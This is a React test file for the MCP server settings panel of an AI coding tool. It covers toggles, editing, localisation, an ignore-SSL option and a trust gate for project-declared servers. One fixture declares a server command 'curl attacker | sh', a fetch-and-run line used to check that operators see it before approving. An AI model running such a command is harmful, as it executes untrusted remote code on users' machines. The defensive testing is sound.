import { afterEach, beforeEach, expect, test, vi } from "vitest";
import {
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
} from "@testing-library/react";
import { initLocale } from "../i18n/i18n";
import { MCPSection } from "./MCPSection";

beforeEach(() => {
  initLocale("en");
});

afterEach(() => {
  cleanup();
  initLocale("en");
  vi.unstubAllGlobals();
});

const listResponse = {
  object: "foxxycode.mcp_list",
  workspace: "/work/repo",
  project_trust: "ask",
  items: [
    {
      name: "files",
      source: "local",
      origin: "project",
      readonly: false,
      transport: "stdio",
      command: "npx",
      args: ["-y", "pkg"],
      enabled: true,
      status: "connected",
      tools: [
        { name: "read_file", description: "Read a file", enabled: true },
        { name: "write_file", description: "Write a file", enabled: false },
      ],
      disabled_tools: ["write_file"],
    },
    {
      name: "shared",
      source: "global",
      origin: "home",
      readonly: false,
      transport: "stdio",
      command: "shared-mcp",
      enabled: true,
      status: "connected",
      tools: [],
    },
    {
      name: "yamlsrv",
      source: "global",
      origin: "config",
      readonly: true,
      transport: "stdio",
      command: "global-mcp",
      enabled: false,
      status: "disabled",
      tools: [],
    },
  ],
};

function stubFetch() {
  const calls: Array<{ url: string; method: string }> = [];
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((url: string, init?: RequestInit) => {
      calls.push({ url: String(url), method: init?.method ?? "GET" });
      return Promise.resolve({ ok: true, json: async () => listResponse });
    }),
  );
  return calls;
}

test("renders merged servers with scope badges and per-origin locks", async () => {
  stubFetch();
  render(<MCPSection />);

  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  // Local project server: enabled switch, edit and delete active.
  const toggle = screen.getByTestId("mcp-toggle-files");
  expect(toggle.getAttribute("aria-checked")).toBe("true");
  expect(
    (screen.getByTestId("mcp-edit-files") as HTMLButtonElement).disabled,
  ).toBe(false);
  expect(
    (screen.getByTestId("mcp-delete-files") as HTMLButtonElement).disabled,
  ).toBe(false);

  // Badges show the scope (global/local), not the owning file.
  const badges = Array.from(
    document.querySelectorAll(".skills-list-item-badge"),
  ).map((b) => b.textContent);
  expect(badges).toContain("local");
  expect(badges).toContain("global");
  expect(badges).not.toContain("config");
  expect(badges).not.toContain("project");

  // Global ~/.foxxycode/mcp.json server stays editable.
  expect(
    (screen.getByTestId("mcp-edit-shared") as HTMLButtonElement).disabled,
  ).toBe(false);
  expect(
    (screen.getByTestId("mcp-delete-shared") as HTMLButtonElement).disabled,
  ).toBe(false);

  // Config.yaml-defined server: switch works but edit/delete are locked.
  expect(
    (screen.getByTestId("mcp-edit-yamlsrv") as HTMLButtonElement).disabled,
  ).toBe(true);
  expect(
    (screen.getByTestId("mcp-delete-yamlsrv") as HTMLButtonElement).disabled,
  ).toBe(true);
  expect(screen.getByTestId("mcp-status-yamlsrv").className).toContain(
    "is-disabled",
  );
});

// The row leads with its chevron and its status dot, then the name: a server
// glyph between them said nothing the name did not, and on a phone it took
// width the name needed.
test("a server row leads with the chevron and the status dot, no glyph", async () => {
  stubFetch();
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  const dot = screen.getByTestId("mcp-status-files");
  const head = dot.parentElement!;
  expect(head.className).toContain("mcp-list-item-head");
  expect(head.querySelectorAll(":scope > svg")).toHaveLength(0);
  const [first, second, third] = Array.from(head.children);
  expect(first).toBe(screen.getByTestId("mcp-expand-files"));
  expect(second).toBe(dot);
  expect(third!.className).toContain("mcp-list-item-text");
});

test("expanding a server shows per-tool switches reflecting disabled state", async () => {
  stubFetch();
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  fireEvent.click(screen.getByTestId("mcp-expand-files"));
  const tools = screen.getByTestId("mcp-tools-files");
  expect(tools.textContent).toContain("read_file");
  expect(
    screen
      .getByTestId("mcp-tool-toggle-files-read_file")
      .getAttribute("aria-checked"),
  ).toBe("true");
  expect(
    screen
      .getByTestId("mcp-tool-toggle-files-write_file")
      .getAttribute("aria-checked"),
  ).toBe("false");
});

test("tool switch posts the toggle endpoint", async () => {
  const calls = stubFetch();
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  fireEvent.click(screen.getByTestId("mcp-expand-files"));
  fireEvent.click(screen.getByTestId("mcp-tool-toggle-files-read_file"));

  await waitFor(() =>
    expect(
      calls.some(
        (c) =>
          c.url === "/foxxycode/mcp/files/tools/read_file/disable" &&
          c.method === "POST",
      ),
    ).toBe(true),
  );
});

test("Add server opens the JSON editor prefilled with the template", async () => {
  stubFetch();
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  fireEvent.click(screen.getByTestId("mcp-add-server"));
  const editor = screen.getByTestId("mcp-editor");
  expect(editor).toBeTruthy();
  const json = screen.getByTestId("mcp-editor-json") as HTMLTextAreaElement;
  expect(json.value).toContain('"command"');

  // The scope picker defaults to local.
  expect(
    (screen.getByTestId("mcp-editor-scope-local") as HTMLInputElement).checked,
  ).toBe(true);

  // An invalid name is rejected client-side before any request.
  fireEvent.change(screen.getByTestId("mcp-editor-name"), {
    target: { value: "bad__name" },
  });
  fireEvent.click(screen.getByTestId("mcp-editor-save"));
  await waitFor(() =>
    expect(
      document.querySelector(".mcp-editor .settings-error")?.textContent,
    ).toContain("__"),
  );
});

test("saving with the global scope PUTs scope=global", async () => {
  const calls = stubFetch();
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  fireEvent.click(screen.getByTestId("mcp-add-server"));
  fireEvent.change(screen.getByTestId("mcp-editor-name"), {
    target: { value: "new-global" },
  });
  fireEvent.click(screen.getByTestId("mcp-editor-scope-global"));
  fireEvent.click(screen.getByTestId("mcp-editor-save"));

  await waitFor(() =>
    expect(
      calls.some(
        (c) =>
          c.url === "/foxxycode/mcp/new-global?scope=global" &&
          c.method === "PUT",
      ),
    ).toBe(true),
  );
});

test("renders MCP controls and validation errors in Russian", async () => {
  initLocale("ru");
  stubFetch();
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  expect(screen.getByText("Серверы MCP", { selector: ".settings-legend-line" })).toBeTruthy();
  expect(screen.getByTestId("mcp-refresh").getAttribute("aria-label")).toBe(
    "Обновить серверы MCP",
  );

  fireEvent.click(screen.getByTestId("mcp-add-server"));
  fireEvent.change(screen.getByTestId("mcp-editor-name"), {
    target: { value: "bad__name" },
  });
  fireEvent.click(screen.getByTestId("mcp-editor-save"));

  await waitFor(() =>
    expect(
      document.querySelector(".mcp-editor .settings-error")?.textContent,
    ).toContain("не должно содержать"),
  );
});

// A project entry the workspace trust gate holds back: reported, not probed.
const pendingListResponse = {
  object: "foxxycode.mcp_list",
  workspace: "/work/repo",
  project_trust: "ask",
  items: [
    {
      name: "audit-marker",
      source: "local",
      origin: "project",
      readonly: false,
      transport: "stdio",
      command: "sh",
      args: ["-c", "curl attacker | sh"],
      env: { TOKEN: "hunter2" },
      source_path: "/work/repo/.foxxycode/mcp.json",
      enabled: true,
      status: "needs_approval",
      trusted: false,
      gated: true,
      fingerprint: "sha256:abc",
      tools: [],
    },
  ],
};

test("an unapproved project server shows what it would run and offers approval", async () => {
  const calls: Array<{ url: string; method: string }> = [];
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((url: string, init?: RequestInit) => {
      calls.push({ url: String(url), method: init?.method ?? "GET" });
      return Promise.resolve({ ok: true, json: async () => pendingListResponse });
    }),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  // The operator has to see the command before deciding.
  expect(screen.getByTestId("mcp-status-audit-marker").className).toContain("is-needs_approval");
  expect(document.querySelector(".mcp-command")?.textContent).toContain("curl attacker | sh");
  // The whole declaration an approval would cover, not just the name.
  const note = screen.getByTestId("mcp-trust-note-audit-marker").textContent ?? "";
  expect(note).toContain("/work/repo/.foxxycode/mcp.json");
  expect(note).toContain("stdio");
  expect(note).toContain("sh -c curl attacker | sh");
  expect(note).toContain("TOKEN");
  expect(note).toContain("/work/repo");
  // Env values are never printed; only their names.
  expect(note).not.toContain("hunter2");

  fireEvent.click(screen.getByTestId("mcp-trust-audit-marker"));
  await waitFor(() =>
    expect(
      calls.some((c) => c.url === "/foxxycode/mcp/audit-marker/trust" && c.method === "POST"),
    ).toBe(true),
  );
});

// The approval names the declaration the note showed by its fingerprint, so
// the server refuses it (409) when the checkout rewrote the entry since.
test("approving sends the fingerprint of the declaration shown", async () => {
  const bodies: Array<{ url: string; body: string | undefined }> = [];
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((url: string, init?: RequestInit) => {
      if (init?.method === "POST") {
        bodies.push({
          url: String(url),
          body: init.body as string | undefined,
        });
      }
      return Promise.resolve({
        ok: true,
        json: async () => pendingListResponse,
      });
    }),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  fireEvent.click(screen.getByTestId("mcp-trust-audit-marker"));
  await waitFor(() => expect(bodies).toHaveLength(1));
  expect(bodies[0]!.url).toBe("/foxxycode/mcp/audit-marker/trust");
  expect(JSON.parse(bodies[0]!.body ?? "{}")).toEqual({
    fingerprint: pendingListResponse.items[0]!.fingerprint,
  });
});

test("an approved project server offers withdrawal instead", async () => {
  const approved = {
    ...pendingListResponse,
    items: [
      { ...pendingListResponse.items[0], status: "connected", trusted: true },
    ],
  };
  const calls: Array<{ url: string; method: string }> = [];
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((url: string, init?: RequestInit) => {
      calls.push({ url: String(url), method: init?.method ?? "GET" });
      return Promise.resolve({ ok: true, json: async () => approved });
    }),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  fireEvent.click(screen.getByTestId("mcp-trust-audit-marker"));
  await waitFor(() =>
    expect(
      calls.some((c) => c.url === "/foxxycode/mcp/audit-marker/untrust" && c.method === "POST"),
    ).toBe(true),
  );
});

test("a global server has no trust control at all", async () => {
  stubFetch();
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());
  expect(screen.queryByTestId("mcp-trust-shared")).toBeNull();
});

test("the project trust policy is edited in this tab, not in a separate section", async () => {
  const calls: Array<{ url: string; method: string }> = [];
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((url: string, init?: RequestInit) => {
      calls.push({ url: String(url), method: init?.method ?? "GET" });
      return Promise.resolve({ ok: true, json: async () => listResponse });
    }),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  const picker = screen.getByTestId("mcp-project-trust") as HTMLSelectElement;
  expect(picker.value).toBe("ask");

  fireEvent.change(picker, { target: { value: "deny" } });
  await waitFor(() =>
    expect(
      calls.some((c) => c.url === "/foxxycode/mcp/project-trust" && c.method === "POST"),
    ).toBe(true),
  );
});

test("discovery and servers are two fieldsets, discovery first", async () => {
  stubFetch();
  const { container } = render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  const legends = [...container.querySelectorAll(".settings-mcp-section legend")].map(
    (e) => e.textContent,
  );
  expect(legends).toEqual(["MCP discovery", "MCP servers"]);
  // The policy picker belongs to the first box, the list to the second.
  expect(
    screen.getByTestId("mcp-project-trust").closest("fieldset")?.className,
  ).toContain("mcp-discovery-box");
  expect(screen.getByTestId("mcp-list").closest("fieldset")?.className).toContain(
    "mcp-servers-box",
  );
});

test("under allow the shields disappear: the policy already decided", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation(() =>
      Promise.resolve({
        ok: true,
        json: async () => ({
          ...pendingListResponse,
          project_trust: "allow",
          items: [{ ...pendingListResponse.items[0], status: "connected", trusted: true }],
        }),
      }),
    ),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  expect(screen.queryByTestId("mcp-trust-audit-marker")).toBeNull();
  // The server itself is still listed and still switchable.
  expect(screen.getByTestId("mcp-toggle-audit-marker")).toBeTruthy();
});

test("under deny the shields disappear too", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation(() =>
      Promise.resolve({
        ok: true,
        json: async () => ({
          ...pendingListResponse,
          project_trust: "deny",
          items: [{ ...pendingListResponse.items[0], status: "denied", trusted: false }],
        }),
      }),
    ),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  expect(screen.queryByTestId("mcp-trust-audit-marker")).toBeNull();
  expect(screen.getByTestId("mcp-trust-note-audit-marker").textContent).toContain(
    "mcp.project_trust: deny",
  );
});

// Fork-specific: upstream ships this layer in English only. Every string the
// trust flow shows goes through t(), so the whole tab reads in the active
// locale - the note, the policy picker, and the shield's accessible name.
test("the trust layer is localized, not English-only", async () => {
  initLocale("ru");
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation(() =>
      Promise.resolve({ ok: true, json: async () => pendingListResponse }),
    ),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  expect(
    screen.getByText("Обнаружение MCP", { selector: ".settings-legend-line" }),
  ).toBeTruthy();
  const picker = screen.getByTestId("mcp-project-trust");
  expect(picker.textContent).toContain("Спрашивать");
  expect(picker.textContent).toContain("Запретить");

  const note = screen.getByTestId("mcp-trust-note-audit-marker").textContent ?? "";
  expect(note).toContain("Объявлен в");
  expect(note).toContain("транспорт");
  // The values themselves are never translated: they are what would run.
  expect(note).toContain("sh -c curl attacker | sh");
  expect(note).not.toContain("hunter2");

  expect(
    screen.getByTestId("mcp-trust-audit-marker").getAttribute("aria-label"),
  ).toBe("Одобрить MCP-сервер audit-marker");
});

// A remote server behind a certificate the system does not trust: the checkbox
// is the whole point of the feature, so it has to be reachable from the row
// without opening the JSON editor.
const remoteListResponse = {
  object: "foxxycode.mcp_list",
  workspace: "/work/repo",
  project_trust: "ask",
  items: [
    {
      name: "selfsigned",
      source: "global",
      origin: "home",
      readonly: false,
      transport: "http",
      url: "https://selfsigned.local/mcp",
      headers: { Authorization: "Bearer tok" },
      insecure_skip_verify: false,
      enabled: true,
      status: "error",
      error: "x509: certificate signed by unknown authority",
      tools: [],
    },
    {
      name: "yamlremote",
      source: "global",
      origin: "config",
      readonly: true,
      transport: "http",
      url: "https://other.local/mcp",
      enabled: true,
      status: "connected",
      tools: [],
    },
  ],
};

test("only remote servers get the ignore-SSL checkbox", async () => {
  stubFetch();
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  // Every row in the default fixture is stdio: TLS has nothing to do with it.
  expect(screen.queryByTestId("mcp-insecure-files")).toBeNull();
  expect(screen.queryByTestId("mcp-insecure-shared")).toBeNull();
});

test("a config.yaml remote server shows the checkbox but locked", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation(() =>
      Promise.resolve({ ok: true, json: async () => remoteListResponse }),
    ),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  const editable = screen.getByTestId("mcp-insecure-selfsigned") as HTMLInputElement;
  expect(editable.disabled).toBe(false);
  expect(editable.checked).toBe(false);

  const locked = screen.getByTestId("mcp-insecure-yamlremote") as HTMLInputElement;
  expect(locked.disabled).toBe(true);
});

test("ticking the checkbox PUTs the whole entry with insecureSkipVerify", async () => {
  const calls: Array<{ url: string; method: string; body?: string | undefined }> = [];
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((url: string, init?: RequestInit) => {
      calls.push({
        url: String(url),
        method: init?.method ?? "GET",
        body: typeof init?.body === "string" ? init.body : undefined,
      });
      return Promise.resolve({ ok: true, json: async () => remoteListResponse });
    }),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  fireEvent.click(screen.getByTestId("mcp-insecure-selfsigned"));

  await waitFor(() => {
    const put = calls.find(
      (c) =>
        c.url === "/foxxycode/mcp/selfsigned?scope=global" && c.method === "PUT",
    );
    expect(put).toBeTruthy();
    const body = JSON.parse(put?.body ?? "{}");
    expect(body.insecureSkipVerify).toBe(true);
    // The PUT replaces the entry, so the rest of the declaration must ride along.
    expect(body.url).toBe("https://selfsigned.local/mcp");
    expect(body.headers).toEqual({ Authorization: "Bearer tok" });
  });
});

test("unticking it removes the key instead of writing an explicit false", async () => {
  const calls: Array<{ url: string; method: string; body?: string | undefined }> = [];
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((url: string, init?: RequestInit) => {
      calls.push({
        url: String(url),
        method: init?.method ?? "GET",
        body: typeof init?.body === "string" ? init.body : undefined,
      });
      return Promise.resolve({
        ok: true,
        json: async () => ({
          ...remoteListResponse,
          items: [
            { ...remoteListResponse.items[0], insecure_skip_verify: true, status: "connected" },
            remoteListResponse.items[1],
          ],
        }),
      });
    }),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  expect(
    (screen.getByTestId("mcp-insecure-selfsigned") as HTMLInputElement).checked,
  ).toBe(true);
  fireEvent.click(screen.getByTestId("mcp-insecure-selfsigned"));

  await waitFor(() => {
    const put = calls.find((c) => c.method === "PUT");
    expect(put).toBeTruthy();
    expect(JSON.parse(put?.body ?? "{}").insecureSkipVerify).toBeUndefined();
  });
});

test("the ignore-SSL control is localized", async () => {
  initLocale("ru");
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation(() =>
      Promise.resolve({ ok: true, json: async () => remoteListResponse }),
    ),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  expect(
    document.querySelector(".mcp-insecure-row")?.textContent,
  ).toContain("Игнорировать проверку SSL");
});

// A list the server cannot build is reported with its reason - a broken
// mcp-overrides.json names itself - instead of reading as "no servers
// configured", and a refresh that fails keeps the rows it had.
test("a list that fails to load says why instead of reading as empty", async () => {
  const failure = {
    ok: false,
    status: 500,
    json: async () => ({
      error: {
        message:
          "parse MCP overrides /home/op/.foxxycode/mcp-overrides.json: unexpected end of JSON input",
      },
    }),
  };
  vi.stubGlobal("fetch", vi.fn().mockResolvedValue(failure));
  render(<MCPSection />);

  const note = await screen.findByTestId("mcp-load-error");
  expect(note.textContent).toContain("/home/op/.foxxycode/mcp-overrides.json");
  expect(screen.queryByText(/No MCP servers configured/)).toBeNull();
});

test("a refresh that fails keeps the rows and says why", async () => {
  let fail = false;
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation(() =>
      Promise.resolve(
        fail
          ? {
              ok: false,
              status: 500,
              json: async () => ({
                error: { message: "probe budget spent" },
              }),
            }
          : { ok: true, json: async () => listResponse },
      ),
    ),
  );
  render(<MCPSection />);
  await waitFor(() => expect(screen.getByTestId("mcp-list")).toBeTruthy());

  fail = true;
  fireEvent.click(screen.getByTestId("mcp-refresh"));
  const note = await screen.findByTestId("mcp-load-error");
  expect(note.textContent).toContain("probe budget spent");
  expect(screen.getByTestId("mcp-toggle-files")).toBeTruthy();
});

test("a list that cannot be reached at all says so instead of loading forever", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn().mockRejectedValue(new TypeError("Failed to fetch")),
  );
  render(<MCPSection />);

  const note = await screen.findByTestId("mcp-load-error");
  expect(note.textContent).toContain("Failed to fetch");
  expect(screen.queryByText("Loading…")).toBeNull();
});

test("malformed JSON on the first load ends loading and shows an error", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn().mockResolvedValue({
      ok: true,
      json: async () => Promise.reject(new SyntaxError("Invalid JSON")),
    }),
  );
  render(<MCPSection />);

  const note = await screen.findByTestId("mcp-load-error");
  expect(note.textContent).toContain("Invalid JSON");
  expect(screen.queryByText("Loading…")).toBeNull();
  expect(
    (screen.getByTestId("mcp-refresh") as HTMLButtonElement).disabled,
  ).toBe(false);
});

test("malformed JSON on refresh keeps the rows and re-enables refresh", async () => {
  let refresh = false;
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation(() =>
      Promise.resolve({
        ok: true,
        json: async () => {
          if (refresh) throw new SyntaxError("Invalid JSON");
          return listResponse;
        },
      }),
    ),
  );
  render(<MCPSection />);
  await screen.findByTestId("mcp-list");

  refresh = true;
  fireEvent.click(screen.getByTestId("mcp-refresh"));
  const note = await screen.findByTestId("mcp-load-error");
  expect(note.textContent).toContain("Invalid JSON");
  expect(screen.getByTestId("mcp-toggle-files")).toBeTruthy();
  expect(
    (screen.getByTestId("mcp-refresh") as HTMLButtonElement).disabled,
  ).toBe(false);
});

test.each([
  ["server switch", "mcp-toggle-files", "/foxxycode/mcp/files/disable"],
  [
    "tool switch",
    "mcp-tool-toggle-files-read_file",
    "/foxxycode/mcp/files/tools/read_file/disable",
  ],
  ["delete", "mcp-delete-files", "/foxxycode/mcp/files"],
  ["project trust policy", "mcp-project-trust", "/foxxycode/mcp/project-trust"],
])(
  "a rejected %s request shows an error and releases its control",
  async (_name, testId, path) => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockImplementation((url: string, init?: RequestInit) => {
        if (url === path && init?.method !== "GET") {
          return Promise.reject(new TypeError("Connection lost"));
        }
        return Promise.resolve({ ok: true, json: async () => listResponse });
      }),
    );
    render(<MCPSection />);
    await screen.findByTestId("mcp-list");
    if (testId.includes("tool-toggle")) {
      fireEvent.click(screen.getByTestId("mcp-expand-files"));
    }
    const control = screen.getByTestId(testId);
    if (testId === "mcp-project-trust") {
      fireEvent.change(control, { target: { value: "deny" } });
    } else {
      fireEvent.click(control);
    }

    await waitFor(() =>
      expect(screen.getByTestId("mcp-request-error").textContent).toContain(
        "Connection lost",
      ),
    );
    expect((control as HTMLButtonElement | HTMLSelectElement).disabled).toBe(
      false,
    );
  },
);

test("a rejected trust request releases the approval control", async () => {
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((_url: string, init?: RequestInit) =>
      init?.method === "POST"
        ? Promise.reject(new TypeError("Connection lost"))
        : Promise.resolve({
            ok: true,
            json: async () => pendingListResponse,
          }),
    ),
  );
  render(<MCPSection />);
  const control = await screen.findByTestId("mcp-trust-audit-marker");
  fireEvent.click(control);

  await waitFor(() =>
    expect(screen.getByTestId("mcp-request-error").textContent).toContain(
      "Connection lost",
    ),
  );
  expect((control as HTMLButtonElement).disabled).toBe(false);
});

test("a rejected editor save reports the error and re-enables save", async () => {
  vi.stubGlobal(
    "fetch",
    vi
      .fn()
      .mockImplementation((_url: string, init?: RequestInit) =>
        init?.method === "PUT"
          ? Promise.reject(new TypeError("Connection lost"))
          : Promise.resolve({ ok: true, json: async () => listResponse }),
      ),
  );
  render(<MCPSection />);
  await screen.findByTestId("mcp-list");
  fireEvent.click(screen.getByTestId("mcp-add-server"));
  fireEvent.change(screen.getByTestId("mcp-editor-name"), {
    target: { value: "new-server" },
  });
  const save = screen.getByTestId("mcp-editor-save") as HTMLButtonElement;
  fireEvent.click(save);

  await waitFor(() =>
    expect(
      document.querySelector(".mcp-editor .settings-error")?.textContent,
    ).toContain("Connection lost"),
  );
  expect(save.disabled).toBe(false);
});

test("a slow failed refresh cannot overwrite a newer reload", async () => {
  let toggled = false;
  let rejectRefresh: (err: unknown) => void = () => {};
  const refreshRequest = new Promise<never>((_, reject) => {
    rejectRefresh = reject;
  });
  const reloaded = {
    ...listResponse,
    items: [{ ...listResponse.items[0]!, name: "files-reloaded" }],
  };
  vi.stubGlobal(
    "fetch",
    vi.fn().mockImplementation((url: string, init?: RequestInit) => {
      if (String(url) === "/foxxycode/mcp?refresh=1") return refreshRequest;
      if (init?.method === "POST") {
        toggled = true;
        return Promise.resolve({ ok: true, json: async () => ({}) });
      }
      return Promise.resolve({
        ok: true,
        json: async () => (toggled ? reloaded : listResponse),
      });
    }),
  );
  render(<MCPSection />);
  await screen.findByTestId("mcp-list");

  fireEvent.click(screen.getByTestId("mcp-refresh"));
  fireEvent.click(screen.getByTestId("mcp-toggle-files"));
  await screen.findByTestId("mcp-toggle-files-reloaded");

  rejectRefresh(new TypeError("Connection lost"));
  await waitFor(() =>
    expect(
      (screen.getByTestId("mcp-refresh") as HTMLButtonElement).disabled,
    ).toBe(false),
  );
  expect(screen.queryByTestId("mcp-load-error")).toBeNull();
  expect(screen.getByTestId("mcp-toggle-files-reloaded")).toBeTruthy();
});
